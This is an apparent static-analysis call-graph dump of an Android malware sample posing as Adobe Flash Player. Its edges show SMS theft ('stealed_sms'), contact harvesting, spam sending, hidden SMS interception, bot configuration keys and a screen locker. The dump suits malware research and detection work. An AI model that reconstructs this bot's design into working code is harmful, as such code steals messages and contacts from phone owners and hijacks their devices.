VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("Off") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\nDebug: ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "sentSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke r5.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r44, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r8 = interfaceinvoke r5.<java.util.Map: java.lang.Object get(java.lang.Object)>($r44) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: $r3 = specialinvoke r0.<com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>("forcelock", $r1) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i2 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("File") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("browserHistory") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>("79262000900", "HELP") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>(r25, r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.app.Service: void onCreate()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}\\SON\\S") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getContacts:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onAttachedToWindow()>() in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onAttachedToWindow()>
VIRTUAL edge: $r24 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("http://", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>(r0, 90000L, 10000L) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" bytes") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $r5 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.BK: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void onCreate(android.os.Bundle)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r34 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "E", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke $r11.<java.lang.String: int indexOf(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>($r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
STATIC edge: $r20 = staticinvoke <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String millisToDate(long)>
STATIC edge: $r9 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r14.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r12) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r8 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.Object getSystemService(java.lang.String)>("power") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void stopSelf()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void stopSelf()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
